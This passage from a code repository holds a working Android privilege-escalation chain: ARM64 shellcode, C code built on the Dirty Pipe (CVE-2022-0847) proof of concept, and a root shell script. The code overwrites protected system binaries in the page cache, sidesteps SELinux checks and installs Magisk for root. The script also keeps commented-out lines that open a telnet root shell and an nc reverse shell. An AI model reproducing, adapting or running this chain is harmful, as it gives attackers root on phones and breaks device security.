    str     w0, [sp, 8]         // save id

    add     sp, sp, 16

    // returned tid on parent, zero on child
    cbnz    w0, return

    // open and mmap stage2 payload from system lib. It circumvent execmem selinux check.
    mov     x0, 0
    adr     x1, lib
    mov     x2, O_RDONLY | O_CLOEXEC
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    mov     x4, x0

    mov     x8, SYS_mmap
    mov     x0, 0
    mov     x3, MAP_SHARED             // args[3] = 0x22
    mov     x5, xzr              // args[5] = 0x0
    mov     x2, PROT_EXEC | PROT_READ
    movl    x1, 0xa000           // args[1] = 0x1000
    svc     0

#if 0
myloop:
    b myloop
#endif

#if STAGE1_DEBUG == 1
    // Debug
    // It will log x0+1 as fault address.
    add x0, x0, 1
    br x0
#endif

    // Launch stage2. Skip first instruction because we can't rewrite first byte.
    add     x0, x0, 4
    br      x0

return:

    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

    // First instruction of original function.
stage1_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    // Back to original
    b       end
end:

stage1_end:
stage1_len:
    .word stage1_end - stage1_data


```

`stage2-c.c`:

```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <android/log.h>
#include <sys/socket.h>
#include <sys/un.h>

//#define STAGE2_DEBUG_LOG
//#define STAGE2_MNT_DEBUG

typedef unsigned long u64;

void dp();
extern u64 mysyscall(u64, ...);
extern void logerror(u64);

struct global {
#ifdef STAGE2_DEBUG_LOG
	u64 libdl_addr;
	void *(*dlopen)(const char *name, int flags);
	void *(*dlsym)(const void *handle, const char *sym);
	int (*vsnprintf)(char *buf, size_t size, const char* fmt, va_list ap);
#endif
};

int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size);
void lo(struct global *global, const char *p, ...);
#define INDEX "a"

u64 mypipe(int fd[2]){
	__asm__("mov x8, SYS_pipe2\n");
	return mysyscall((u64)fd, 0);
}

u64 createfile(const char *f){
	__asm__("mov x8, SYS_openat\n");
	return mysyscall(0, f, O_CREAT | O_EXCL);
}

u64 mygettid() {
	__asm__("mov x8, SYS_gettid\n");
	return mysyscall(0);
}

u64 myfcntl(int fd, int flags){
	__asm__("mov x8, SYS_fcntl\n");
	return mysyscall(fd, flags);
}

u64 myopen(const char *p, int flags){
	__asm__("mov x8, SYS_openat\n");
	return mysyscall(0, p, flags);
}
u64 mywrite(int fd, const char *p, int len){
	__asm__("mov x8, SYS_write\n");
	return mysyscall(fd, p, len);
}

u64 myread(int fd, char *p, int len){
	__asm__("mov x8, SYS_read\n");
	return mysyscall(fd, p, len);
}

u64 myclose(int fd){
	__asm__("mov x8, SYS_close\n");
	return mysyscall(fd);
}

u64 mylseek(int fd, u64 offset, u64 whence){
	__asm__("mov x8, SYS_lseek\n");
	return mysyscall(fd, offset, whence);
}

u64 mysplice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags){
	__asm__("mov x8, SYS_splice\n");
	return mysyscall(fd_in, off_in, fd_out, off_out, len, flags);
}

u64 mymmap(void *a, u64 len, int prot, int flags, int fd, off_t offset){
	__asm__("mov x8, SYS_mmap\n");
	return mysyscall((u64)a, len, prot, flags, fd, offset);
}

u64 mysocket(int af, int p, int q) {
	__asm__("mov x8, SYS_socket\n");
	return mysyscall(af, p, q);
}

u64 myconnect(int fd, struct sockaddr *a, int len) {
	__asm__("mov x8, SYS_connect\n");
	return mysyscall(fd, a, len);
}

u64 mywritev(unsigned long fd,const struct iovec *vec, unsigned long vlen){
	__asm__("mov x8, SYS_writev\n");
	return mysyscall(fd, vec, vlen);
}

u64 myexecve(const char *p, const char **argv, const char **envp) {
	__asm__("mov x8, SYS_execve\n");
	return mysyscall((u64)p, argv, envp);
}

u64 myclone(unsigned long flags, void *stack_base,
		int *parent_tid, unsigned long tls, int *child_tid) {
	__asm__("mov x8, SYS_clone\n");
	return mysyscall(flags, stack_base, parent_tid, tls, child_tid);
}

#define P_PID 1
u64 mywaitid(int idtype, u64 id, void *infop, int options, void *ru) {
	__asm__("mov x8, SYS_waitid\n");
	return mysyscall(idtype, id, infop, options, ru);
}

#ifdef STAGE2_MNT_DEBUG
u64 myreadlinkat(int dirfd, const char *path, char *buf, int bufsiz) {
	__asm__("mov x8, SYS_readlinkat\n");
	return mysyscall(dirfd, path, buf, bufsiz);
}
#endif

static void prepare_pipe(struct global *global, int p[2])
{
	if (mypipe(p)) {
	}

	const unsigned pipe_size = myfcntl(p[1], F_GETPIPE_SZ);
	char buffer[4096];

	lo(global, "pipe_size: %d\n", pipe_size);

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		mywrite(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		myread(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

int overwrite(struct global *global, int p[2], int fd, loff_t offset, const char *data, int data_size) {
	if(mylseek(fd, 0, SEEK_SET) < 0){
		lo(global, "lse");
	}
	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
	--offset;
	loff_t nbytes = mysplice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		lo(global, "spl");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		lo(global, "sho\n");
		return EXIT_FAILURE;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = mywrite(p[1], data, data_size);
	if (nbytes < 0) {
		lo(global, "wri");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		lo(global, "sho\n");
		return EXIT_FAILURE;
	}
	//lo(global, "ok");
	return 0;
}

int mystrcmp(const char *a, const char *b){
	for(; *a && *b; a++,b++){
		if(*a > *b){
			return 1;
		}else if(*b > *a){
			return -1;
		}
	}
	if(*a > *b){
		return 1;
	}else if(*b > *a){
		return -1;
	}
	return 0;
}

int mystrlen(const char *a){
	int l = 0;
	for(; a[l]; l++){}
	return l;
}

int cmpsuf(const char *a, const char *b){
	int alen = mystrlen(a);
	int blen = mystrlen(b);
	if(alen < blen){
		return 0;
	}
	return mystrcmp(a + alen - blen, b) == 0;
}

#ifdef STAGE2_DEBUG_LOG
void parse_line(const char *l, int len, struct global *global) {
	u64 addr = 0;
	for(int i = 0; l[i]; i++){
		if(l[i] == '-'){
			break;
		}else{
			addr <<= 4;
			if('0' <= l[i] && l[i] <= '9'){
				addr += l[i] - '0';
			}else if('a' <= l[i] && l[i] <= 'f'){
				addr += l[i] - 'a' + 10;
			}
		}
	}
	//logerror(*(u64*)l);
	if(global->libdl_addr == 0 && cmpsuf(l, "/system/lib64/bootstrap/libdl.so")){
		global->libdl_addr = addr;
		// Device specific
		global->dlopen = (typeof(global->dlopen))(global->libdl_addr + 0x1014);
		global->dlsym = (typeof(global->dlsym))(global->libdl_addr + 0x1044);
	}
}

int max(int a, int b){
	return a > b ? a : b;
}
int min(int a, int b){
	return a < b ? a : b;
}

void prepare_log(struct global *global) {
	int fd = myopen("/proc/self/maps", O_RDONLY);
	char linebuf[1000];
	char ch;
	int pos = 0;
	while(myread(fd, &ch, 1) > 0){
		if(ch == '\n'){
			int len = min(pos, sizeof(linebuf) - 1);
			linebuf[len] = 0;
			if(len > 0){
				parse_line(linebuf, len, global);
			}
			pos = 0;
		}else{
			if(pos < sizeof(linebuf) - 1){
				linebuf[pos] = ch;
			}
			pos++;
		}
	}
	myclose(fd);
}
#endif

void mymemcpy(char *dest, const char *src, int len){
	for(int i = 0; i < len; i++){
		dest[i] = src[i];
	}
}

void mystrcpy(char *dest, const char *src){
	mymemcpy(dest, src, mystrlen(src));
}

void mymemset(volatile char *dest, char ch, int len){
	volatile int i;
	for(i = 0; i < len; i++){
		dest[i] = ch;
	}
}

typedef struct __attribute__((__packed__)) {
  unsigned char id;
  uint16_t tid;
  unsigned long realtime;
} android_log_header_t;

void writelog(const char *buf) {
	android_log_header_t he;
	he.id = 0;
	he.tid = mygettid();
	struct iovec vec[4];
	vec[0].iov_base = (unsigned char *)&he;
	vec[0].iov_len = sizeof(he);
	vec[1].iov_base = "\x4";
	vec[1].iov_len = 1;
	vec[2].iov_base = "stage2";
	vec[2].iov_len = 7;
	vec[3].iov_base = (void *)buf;
	vec[3].iov_len = mystrlen(buf) + 1;

	int sockfd = mysocket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0);
	struct sockaddr_un addr;
	mymemset((char *)&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	mystrcpy(addr.sun_path, "/dev/socket/logdw");
	int r = myconnect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
	mywritev(sockfd, vec, 4);
	myclose(sockfd);
}

void lo(struct global *global, const char *p, ...) {
#ifdef STAGE2_DEBUG_LOG
	va_list l;
	va_start(l, p);

	char buf[201];
	mymemset(buf, 0, 201);
	global->vsnprintf(buf, 200, p, l);
	writelog(buf);

	va_end(l);
#endif
}

#define LIBMOD_PAGES 4

void c_entry(const char *arg_libname, const char *arg_root_cmd) {
	const char *modprobe_path = "/vendor/bin/modprobe";

	__asm__(".include \"include.inc\"\n");

	struct global *global = (struct global *)mymmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
	char *modprobe_backup = (char *)mymmap(0, PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
	char *libmod_backup = (char *)mymmap(0, LIBMOD_PAGES * PAGE_SIZE, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);

#ifdef STAGE2_DEBUG_LOG
	prepare_log(global);

	void *libc = global->dlopen("libc.so", 0);
	global->vsnprintf = (typeof(global->vsnprintf))
		global->dlsym(libc, "vsnprintf");

	lo(global, "Param: %s %s\n", arg_libname, arg_root_cmd);
#endif

#if STAGE2_DEBUG == 1
	myopen("/dev/.s2a", O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC);
	__asm__("mov x8, SYS_exit\n");
	mysyscall(2);
#endif

	int fds = myopen(modprobe_path, O_RDONLY | O_CLOEXEC);
	int fdmod = myopen(arg_libname, O_RDONLY | O_CLOEXEC);

	myread(fds, modprobe_backup, PAGE_SIZE);
	myread(fdmod, libmod_backup, LIBMOD_PAGES * PAGE_SIZE);

	int p[2];
	prepare_pipe(global, p);

	// Calculate address of modprobe-payload + mymod.ko
	u64 next_payload = ((u64)c_entry) & ~(PAGE_SIZE-1);
	next_payload += PAGE_SIZE;

	overwrite(global, p, fds, 1, (char*)next_payload + 1, PAGE_SIZE - 1);
	for(int i = 0; i < LIBMOD_PAGES; i++){
		overwrite(global, p, fdmod, i * PAGE_SIZE + 1, (char*)next_payload + PAGE_SIZE * (i+1) + 1, PAGE_SIZE - 1);
	}

#ifdef STAGE2_MNT_DEBUG
	char mntbuf[100];
	myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
	lo(global, "mnt ns before clone ns=%s\n", mntbuf);
#endif

	u64 ret = myclone(SIGCHLD, NULL, NULL, 0, NULL);

	if(ret == 0){
#ifdef STAGE2_MNT_DEBUG
		myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
		lo(global, "mnt ns child ns=%s\n", mntbuf);
#endif
		const char *selinux_context = "u:r:vendor_modprobe:s0";
		int fdat = myopen("/proc/self/attr/exec", O_RDWR);
		mywrite(fdat, selinux_context, mystrlen(selinux_context));
		myclose(fdat);

		const char *argv[] = {modprobe_path, arg_libname, arg_root_cmd, NULL};

		myexecve(argv[0], argv, NULL);
	}else{
#ifdef STAGE2_MNT_DEBUG
		myreadlinkat(0, "/proc/self/ns/mnt", mntbuf, sizeof(mntbuf) - 1);
		lo(global, "mnt ns parent ns=%s\n", mntbuf);
#endif

		lo(global, "Wait for child pid=%d\n", ret);
		u64 ret2 = mywaitid(P_PID, ret, NULL, WEXITED, NULL);
		lo(global, "waitid returned with %lu. Restore files.\n", ret2);

		overwrite(global, p, fds, 1, modprobe_backup + 1, PAGE_SIZE - 1);
		for(int i = 0; i < LIBMOD_PAGES; i++){
			overwrite(global, p, fdmod, i * PAGE_SIZE + 1, libmod_backup + PAGE_SIZE * i + 1, PAGE_SIZE - 1);
		}
	}

	__asm__("mov x8, SYS_exit\n");
	mysyscall(0);
}

```

`stage2-payload-include.S`:

```S
.global stage2_payload
.data
stage2_payload:
.incbin "stage2-payload"

```

`stage2.S`:

```S
    .arch armv8-a

    .include "include.inc"

    .global mysyscall
    .global _start
//    .global logerror
    .global libname
    .global root_cmd

    .global c_entry

stage2_data:
    .word 0 // dummy

_start:
    adr x0, L_libname
    adr x1, L_root_cmd
    bl c_entry

exit:
    mov x0, xzr
    mov x8, SYS_exit
    svc 0

mysyscall:
    svc 0
    ret

//logerror:
//    br x0

libname:
L_libname:
    .space 128, 0
root_cmd:
L_root_cmd:
    .space 128, 0


```

`stage2.lds`:

```lds
SECTIONS
{
. = 0x2000;
.text : {
stage2.o (.text)
stage2-c.o (.text)
*(.rodata)
*(.rodata.*)
}
.data : {
*(.data)
*(.eh_frame*)
}
.bss : { *(.bss) }

}

```

`startup-root`:

```
#!/system/bin/sh
# Called from modprobe-payload
# Now in root user + permissive domain (u:r:vendor_modprobe:s0)

BASE_DIR=$(readlink -f $(dirname $0))

if [ -z "$1" ]; then
    log=$BASE_DIR/root-log1

    # BOOTCLASSPATH is required for magiskd
    export ANDROID_DATA=/data
    export ANDROID_ART_ROOT=/apex/com.android.art
    export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
    export SYSTEMSERVERCLASSPATH=/system/framework/com.android.location.provider.jar:/system/framework/services.jar:/system/framework/ethernet-service.jar:/apex/com.android.appsearch/javalib/service-appsearch.jar:/apex/com.android.media/javalib/service-media-s.jar:/apex/com.android.permission/javalib/service-permission.jar
    export TERM=xterm-256color
    export ANDROID_SOCKET_adbd=23
    export ANDROID_STORAGE=/storage
    export EXTERNAL_STORAGE=/sdcard
    export DOWNLOAD_CACHE=/data/cache
    export ANDROID_ASSETS=/system/app
    export STANDALONE_SYSTEMSERVER_JARS=
    export DEX2OATBOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar
    export BOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar:/apex/com.android.appsearch/javalib/framework-appsearch.jar:/apex/com.android.conscrypt/javalib/conscrypt.jar:/apex/com.android.ipsec/javalib/android.net.ipsec.ike.jar:/apex/com.android.media/javalib/updatable-media.jar:/apex/com.android.mediaprovider/javalib/framework-mediaprovider.jar:/apex/com.android.os.statsd/javalib/framework-statsd.jar:/apex/com.android.permission/javalib/framework-permission.jar:/apex/com.android.permission/javalib/framework-permission-s.jar:/apex/com.android.scheduling/javalib/framework-scheduling.jar:/apex/com.android.sdkext/javalib/framework-sdkextensions.jar:/apex/com.android.tethering/javalib/framework-connectivity.jar:/apex/com.android.tethering/javalib/framework-tethering.jar:/apex/com.android.wifi/javalib/framework-wifi.jar
    export SHELL=/bin/sh
    export ANDROID_BOOTLOGO=1
    export ASEC_MOUNTPOINT=/mnt/asec
    export HOSTNAME=oriole
    export TMPDIR=/data/local/tmp
    export ANDROID_ROOT=/system
    export ANDROID_I18N_ROOT=/apex/com.android.i18n

    export USER=root
    export PATH=/data/local/tmp/bin:/dev/.magisk:/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
    export HOME=$BASE_DIR

    # Sometimes unstable behaviors like EACCESS on accessing file happen.
    # It may be caused by cache of old selinux policy.
    # Wait for flush of the cache.
    # TODO: Fix kernel module to flush cache manually.
    for i in `seq 1 100`; do
        rm $log
        result1=$?
        touch $log
        result2=$?
        if [ $result1 = 0 -a $result2 = 0 ]; then
            echo Successfully access log. Try=$i > $log
            break
        fi
        sleep 1
    done

    echo Start startup-root. BASE_DIR=$BASE_DIR >> $log

    #$BASE_DIR/magiskpolicy --save $BASE_DIR/policy-dump
    ln -s $BASE_DIR/magisk/magiskinit $BASE_DIR/magisk/magiskpolicy 2>> $log
    chmod 755 $BASE_DIR/magisk/magiskinit $BASE_DIR/magisk/magisk $BASE_DIR/magisk/busybox
    $BASE_DIR/magisk/magiskpolicy --magisk --live 2>> $log

    echo u:r:magisk:s0 > /proc/self/attr/current

    echo `date`: `id` >> $log

    # Send completion signal to restore files
    $BASE_DIR/magisk/busybox killall -s SIGUSR1 dirtypipe-android

    # INSECURE
    # $BASE_DIR/magisk/busybox telnetd -l /bin/sh -p 10848 &

    # Reverse shell: A little safer
    #HOST=127.0.0.1
    #PORT=10847
    #sleep 1
    #FIFO=$BASE_DIR/reverse-fifo
    #
    #rm -f $FIFO
    #mkfifo $FIFO
    #cat $FIFO | /system/bin/sh -i 2>&1|$BASE_DIR/magisk/busybox nc $HOST $PORT > $FIFO

    # Experimental Magisk root access.

    # Avoid error: 'CANNOT LINK EXECUTABLE "/system/bin/app_process64": library "libnativeloader.so" not found: needed by main executable'
    # startup-root is launched in bootstrap mount namespace. It prevent app_process from launch. Pull default ns from init to avoid it.
    # I don't know why we are in bootstrap mount ns even though we forked from init.
    $BASE_DIR/magisk/busybox nsenter -t 1 -m $0 magisk > $BASE_DIR/mylog2 2>&1 < /dev/null

else
    #set -e

    id

    $BASE_DIR/env-patcher || true

    # Credit: https://github.com/j4nn/CVE-2020-0041/blob/v50g8-mroot/scripts/magisk-start.sh

    killall -KILL magiskd || true

    #./magiskpolicy --live --magisk "allow shell * * *"

    # Stuck until screen is unlocked?
    pm install -r $BASE_DIR/magisk/Magisk-v24.3.apk > /dev/null 2>&1 < /dev/null || true

    M=/dev/.magisk

    umount $M || true
    mkdir $M 2> /dev/null || true
    mount -t tmpfs none $M
    cp $BASE_DIR/magisk/* $M || true

    cd $M

    chcon u:object_r:magisk_file:s0 /dev/.magisk
    chcon u:object_r:magisk_file:s0 /dev/.magisk/*
    chmod 755 /dev/.magisk /dev/.magisk/*

    for i in su resetprop ; do ln -s $M/magisk $M/$i ; done

    mkdir $M/.magisk
    chmod 755 $M/.magisk
    echo "KEEPVERITY=true" > $M/.magisk/config
    echo "KEEPFORCEENCRYPT=true" >> $M/.magisk/config
    chmod 000 $M/.magisk/config

    mkdir -p /data/adb/magisk
    chmod 700 /data/adb
    chmod -R 755 /data/adb/magisk
    chown -R root:root /data/adb/magisk

    mkdir -p $M/.magisk/busybox ; chmod 755 $M/.magisk/busybox
    mv busybox $M/.magisk/busybox
    #$M/.magisk/busybox/busybox --install -s $M/.magisk/busybox

    mkdir -p $M/.magisk/mirror ; chmod 000 $M/.magisk/mirror
    mkdir -p $M/.magisk/block ; chmod 000 $M/.magisk/block
    mkdir -p $M/.magisk/modules ; chmod 755 $M/.magisk/modules
    #ln -s $M/.magisk/modules $M/.magisk/img
    mkdir -p /data/adb/modules ; chmod 755 /data/adb/modules
    mkdir -p /data/adb/post-fs-data.d ; chmod 755 /data/adb/post-fs-data.d
    mkdir -p /data/adb/service.d ; chmod 755 /data/adb/service.d

    #$M/magisk --restorecon
    chcon -R -h u:object_r:rootfs:s0 $M/.magisk
    chcon u:object_r:magisk_file:s0 $M/.magisk/busybox/busybox

    $M/magisk --daemon

    chmod 755 $M
    #chcon u:object_r:system_file:s0 $M/magisk
    #chcon u:object_r:system_file:s0 $M
fi

```